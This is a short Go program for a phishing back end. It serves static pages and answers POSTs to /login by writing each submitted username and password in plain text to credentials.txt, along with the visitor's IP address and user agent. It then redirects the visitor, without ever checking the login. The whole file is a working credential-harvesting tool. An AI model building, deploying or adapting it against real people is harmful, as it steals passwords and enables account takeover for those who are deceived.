package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/Sirupsen/logrus"
	"github.com/gorilla/mux"
)

func main() {
	addr := flag.String("l", ":8080", "Listen address")
	logfile := flag.String("o", "credentials.txt", "Login attempts output file")
	flag.Parse()

	fh, err := os.OpenFile(*logfile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		log.Fatal(err)
	}
	defer fh.Close()
	logrus.SetOutput(fh)

	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	fmt.Printf("Listening on %s\n", *addr)
	log.Fatal(http.ListenAndServe(*addr, r))
}

func login(w http.ResponseWriter, req *http.Request) {
	logrus.WithFields(logrus.Fields{
		"time":       time.Now().String(),
		"username":   req.FormValue("_user"),
		"password":   req.FormValue("_pass"),
		"user_agent": req.UserAgent(),
		"ip_address": req.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w, req, "/", 302)
}
